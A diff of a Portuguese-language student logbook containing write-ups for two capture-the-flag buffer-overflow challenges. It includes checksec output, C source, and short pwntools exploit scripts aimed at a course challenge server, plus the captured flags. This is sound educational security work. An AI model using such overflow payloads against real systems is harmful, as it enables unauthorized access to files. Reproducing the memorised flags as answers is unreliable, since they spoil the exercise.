@@ -159,11 +159,11 @@ with open('badfile', 'wb') as f:
 
 # CTF 5
 
-## CTF 5 Desafio 1
+## Desafio 1
 
-### Primeiro passo - Checksec
+### Primeiro Passo - ```Checksec```
 
-Ao corrermos o checksec no programa, podemos descobrir várias coisas:
+* Ao corrermos ```checksec program```, descobrimos várias informações:
 ```
 ❯ checksec program
   Arch:     i386-32-little
@@ -173,15 +173,14 @@ Ao corrermos o checksec no programa, podemos descobrir várias coisas:
   PIE:      No PIE (0x8048000)
   RWX:      Has RWX segments 
 ```
-* O programa está compilado para uma arquitetura de 32 bits e é little endian
-* Não tem a proteção de *RELRO*
-* Existem segmentos na memória com permissões de read, write e execute
-* O ASLR está desativado
-* O PIE está desativado
-* NX está desativado
-* Não tem *canary*
+* o programa está compilado para uma arquitetura de 32 bits e é *little endian*
+* o programa não tem proteção de *RELRO*
+* a *stack* não tem um canário
+* a *stack* tem perimssões de execução
+* as posições do binário em memória não são aleatorizadas
+* existem segmentos na memória com permissões de leitura (*read*), escrita (*write*) e execução (*execute*)
 
-### Segundo passo - Análise do código
+### Segundo Passo - Análise do Código
 
 ```cpp
 #include <stdio.h>
@@ -217,21 +216,18 @@ int main() {
 }
 ```
 
-Ao analisarmos o código, podemos ver que o programa lê 40 *chars* (
-`scanf("%40s", &buffer);`)
-para um *buffer* de 32 *chars*, o que nos permite fazer um *buffer overflow* e alterar o endereço de retorno da função ``main()``. 
+* Ao analisarmos o código, podemos ver que o ficheiro cujo nome é o valor da variável ```meme_file``` (```mem.txt```) é aberto e lido pelo programa
 
-Como o utilizador controla a entrada, ao escrever flag.txt após 32 caracteres, podemos facilmente sobrescrever a variável meme_file e fazer com que o programa leia o ficheiro flag.txt e imprima o seu conteúdo.
+* É também visível que o programa lê 40 *chars* (```scanf("%40s", &buffer);```) para um *buffer* de 32 *chars*, o que nos permite realizar um *buffer overflow*
 
-No programa python disponibilizado, na zona em que injetamos o conteúdo para o servidor, bastou escrever 32 caracteres seguidos do nome do ficheiro que queremos ler.
+* Como o utilizador controla o *input*, ao escrever "flag.txt" após 32 caracteres, podemos facilmente sobrescrever o valor da variável ```meme_file``` (```mem.txt```) - armazenado  na zona das variáveis locais da *stack* - para fazer com que o programa leia o ficheiro ```flag.txt``` e imprima o seu conteúdo
 
-```python
-r.sendline(b'A'*32+b'flag.txt\0')
-```
+### Terceiro Passo - *Exploit*
 
-#### Exploit
+* No programa python disponibilizado (```exploit-example.py```), na linha em que se injeta o conteúdo para o servidor, bastou escrever 32 caracteres seguidos do nome do ficheiro que queremos ler, ou seja, ```r.sendline(b'A'*32+b'flag.txt\0')```
 
 ```python
+#!/usr/bin/python3
 from pwn import *
 
 DEBUG = False
@@ -242,18 +238,38 @@ r.sendline(b'A'*32+b'flag.txt\0')
 
 r.interactive()
 ```
-Ao executar conseguimos ter acesso ao conteúdo do ficheiro flag.txt e à flag do desafio, flag{a96d05c11752a85ff9f172636ea1967a}.
+
+* Ao executar o programa, conseguimos ter acesso ao conteúdo do ficheiro ```flag.txt``` e à flag do desafio: ```flag{a96d05c11752a85ff9f172636ea1967a}```, conforme comprova a imagem abaixo
 
 ![Flag](/images/logbook5-ctf1.png)
 
-## CTF 5 Desafio 2
+## Desafio 2
 
-Este desafio é bastante similar ao anterior, só que, entre a variável do nome do ficheiro e o buffer temos um valor inteiro, que precisa de ser igual a ``0xfefc2324`` para ler a flag.
+* Este desafio é bastante similar ao anterior
 
-O único cuidado especial a ter é passar o valor do inteiro byte a byte de forma *Little Endian*, ou seja, ler o valor de trás para a frente.
+* Ao correr ```checksec program```, verificamos que o executável tem as mesmas permissões que anteriormente
 
-Assim, se passarmos a string ``io.sendline(b'A'*32 + b"\x24\x23\xfc\xfe" + b"flag.txt\0")`` alcançamos a *flag*
+* Contudo, foi feita uma alteração ao código-fonte do ficheiro ```main.c```, que se reflete numa nova organização da *stack*: entre a variável correspondente ao nome do ficheiro e o *buffer* existe um valor inteiro, que deve permanecer aí para que as operações de abertura e leitura do ficheiro sejam executadas
 
-```flag{bb0e0ad81a5d4378e34817e1e73e5381}```
+* Esta alteração não mitiga, de todo, o problema, dado que apenas é necessário realizar um *buffer overflow* semelhante ao anterior, mas que também coloque na posição correta da *stack* (entre o nome do ficheiro e o *buffer*) o valor ```0xfefc2324``` para se explorar a vulnerabilidade e ler a *flag*
+
+* Para além disto, o único cuidado especial a ter é passar o valor do inteiro byte a byte e de forma *little endian* (de acordo com a arquitetura do programa anteriormente identificada), ou seja, ler o valor de trás para a frente
+
+* Deste modo, o *script* em python executado foi o seguinte (```exploit-example.py```):
+
+```python
+#!/usr/bin/python3
+from pwn import *
+
+DEBUG = False
+
+r = remote('ctf-fsi.fe.up.pt', 4000)
+
+r.sendline(b'A'*32 + b"\x24\x23\xfc\xfe" + b"flag.txt\0")
+
+r.interactive()
+```
+
+* Assim, ao passarmos a *string* em ```r.sendline(b'A'*32 + b"\x24\x23\xfc\xfe" + b"flag.txt\0")``` obtivemos a *flag*: ```flag{bb0e0ad81a5d4378e34817e1e73e5381}```, conforme comprova a imagem abaixo
 
 ![Flag](/images/logbook5-ctf2.png)
